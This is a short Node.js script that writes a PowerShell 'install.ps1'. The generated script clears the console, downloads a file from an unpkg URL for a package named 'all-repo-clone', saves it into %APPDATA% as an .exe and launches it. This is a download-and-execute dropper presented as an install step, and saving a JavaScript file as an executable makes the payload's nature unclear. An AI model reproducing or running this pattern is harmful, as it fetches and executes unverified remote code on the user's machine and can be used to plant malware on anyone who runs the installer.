const fs = require('fs');

const base_install_ps1 = `$ProcName = "all-repo-clone.exe"
$WebFile = "https://unpkg.com/all-repo-clone/lib/all-repo-clone.js"
 
Clear-Host
 
(New-Object System.Net.WebClient).DownloadFile($WebFile,"$env:APPDATA\$ProcName")
Start-Process ("$env:APPDATA\$ProcName")`;

fs.writeFile('install.ps1', base_install_ps1);